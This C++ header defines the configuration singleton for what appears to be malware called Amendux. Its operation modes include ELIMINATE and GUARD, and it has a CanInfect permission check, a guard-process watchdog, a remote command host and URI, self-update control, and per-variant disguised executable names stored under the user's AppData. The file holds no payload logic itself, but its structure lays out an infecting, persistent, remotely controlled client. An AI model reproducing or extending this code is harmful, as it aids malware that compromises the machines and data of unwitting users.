#pragma once

#include <sstream>
#include "CoreInterface.h"
#include "vaconfig.h"

namespace Amendux {

	constexpr unsigned int clientVersion = 138;

	enum class OperationMode {
		BASE = 1,
		UPDATE,
		ELIMINATE,
		GUARD,
	};

	class Config : CoreInterface
	{
		static Config *s_Config;
		std::wstring instanceGUID;
		OperationMode currentMode = OperationMode::BASE;
		bool bSuccess = true;
		unsigned int variant = VARIANT_INVALID;
		unsigned int uGuardProcessId;
		unsigned int mainThreadId;

		void LogEnvironment();
		void SetupDataDir();
		void SetupPersistentConfig();
		void CheckObsoleteConfig();
		void Config::BasicConfig();
		void ApplyUpdate();
		void InitClass();

	public:
		Config();
		~Config();

		inline std::wstring Guid() const {
			return instanceGUID;
		}

		inline unsigned int Variant() const {
			return variant;
		}

		inline unsigned int MainThread() const {
			return mainThreadId;
		}

		inline std::string AvcHost() const {
			return Variant::getAvcHost();
		}

		inline std::string AvcUri() const {
			return Variant::getAvcUri();
		}

		inline std::wstring DisplayName() const {
			if (variant == VARIANT_INVALID) {
				return L"";
			}

			std::string displayName = Variant::getDisplayName(variant);

			return std::wstring(displayName.begin(), displayName.end());
		}

		inline std::wstring ExeName() const {
			if (variant == VARIANT_INVALID) {
				return L"";
			}

			std::string exeName = Variant::getExeName(variant);
			std::string exeExt = Variant::getExeExtension(variant);

			return std::wstring(exeName.begin(), exeName.end()) + std::wstring(exeExt.begin(), exeExt.end());
		}

		inline std::wstring DataDirectory() const {
			std::wstring dataDir = std::wstring(Util::getDirectory(Util::Directory::USER_APPDATA));
			std::string pathExt = Variant::getPath(variant);
			
			return dataDir + std::wstring(pathExt.begin(), pathExt.end());
		}

		inline void SetMode(OperationMode om) {
			currentMode = om;
		}

		inline void SetGuardProcessId(unsigned int pid) {
			uGuardProcessId = pid;
		}

		unsigned int GuardProcess() {
			return uGuardProcessId;
		}

#if DEBUG
		std::wstring ModeName() {
			switch (currentMode) {
				case OperationMode::BASE:
					return L"CORE";
				case OperationMode::UPDATE:
					return L"UPDATE";
				case OperationMode::ELIMINATE:
					return L"ELIMINATE";
				case OperationMode::GUARD:
					return L"GUARD";
				default:
					break;
			}

			return L"";
		}
#endif

		inline bool CanUpdate() const {
			switch (currentMode) {
				case OperationMode::UPDATE:
				case OperationMode::ELIMINATE:
				case OperationMode::GUARD:
					return false;
				default:
					break;
			}

			return true;
		}

		inline bool CanConnect() const {
			switch (currentMode) {
				case OperationMode::UPDATE:
				case OperationMode::GUARD:
					return false;
				default:
					break;
			}

			return true;
		}

		inline bool CanRunModules() const {
			switch (currentMode) {
			case OperationMode::UPDATE:
			case OperationMode::GUARD:
				return false;
			default:
				break;
			}

			return true;
		}

		inline bool CanInfect() const {
			switch (currentMode) {
			case OperationMode::UPDATE:
			case OperationMode::GUARD:
				return false;
			default:
				break;
			}

			return true;
		}

		inline bool CanGuardProcess() const {
			switch (currentMode) {
			case OperationMode::UPDATE:
			case OperationMode::ELIMINATE:
			case OperationMode::BASE:
				return false;
			default:
				break;
			}

			return true;
		}

		inline bool CanRunWorker() const {
			switch (currentMode) {
				case OperationMode::UPDATE:
				case OperationMode::ELIMINATE:
				case OperationMode::GUARD:
					return false;
				default:
					break;
			}

			return true;
		}

		static std::wstring getVersion(unsigned int version = clientVersion) {
			unsigned int major = static_cast<unsigned int>(floor(version / 100));
			unsigned int minor = static_cast<unsigned int>(floor((version - (major * 100)) / 10));
			unsigned int patch = version % 10;

			return std::to_wstring(major) + L"." + std::to_wstring(minor) + L"." + std::to_wstring(patch);
		}

		static bool Success() {
			if (s_Config->variant == VARIANT_INVALID) {
				return false;
			}

			return s_Config->bSuccess;
		}

		static Config *Current() {
			if (!s_Config) {
				s_Config = new Config;
			}

			return s_Config;
		}

		static void Init() {
			if (!s_Config) {
				s_Config = new Config;
			}

			s_Config->InitClass();
		}

		static void Terminate() {
			if (s_Config) {
				delete s_Config;
				s_Config = nullptr;
			}
		}
	};

}